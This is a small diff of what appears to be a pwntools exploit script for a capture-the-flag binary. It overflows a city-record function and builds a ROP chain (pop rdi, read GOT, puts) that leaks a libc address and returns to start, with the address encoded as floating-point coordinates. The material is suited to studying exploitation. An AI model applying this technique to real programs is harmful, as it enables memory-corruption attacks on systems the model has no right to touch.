@@ -47,8 +47,8 @@ puts = binary.symbols.plt.puts
 add_city(b'First', 10, 10, 10, 10, 10) # Overflow
 
 #add_city('Second', 10.5, 10.5, 0xdddddddddddddddd, 0xeeeeeeeeeeeeeeee, 0xffffffffffffffff)
-chain(b'Second', pop_rdi, read_got, puts, 0x11, 0x10)
-chain(b'Third', pop_rdi, read_got, puts, 0.4198704, 0) # 0.4198704 to restart  ## hex(int(0.4198704 * 10000000.0)) = start
+chain(b'Second', pop_rdi, read_got, puts, 0x11, 0x10) # lat is least significant bytes, long is most significant bytes
+chain(b'Third', pop_rdi, read_got, puts, start/10000000.0, 0) # 0.4198704 to restart  ## hex(int(0.4198704 * 10000000.0)) = start, to find 0.4198704 just do start/10000000.0
 
 p.recvuntil(b'> ')
 p.sendline(b'2')
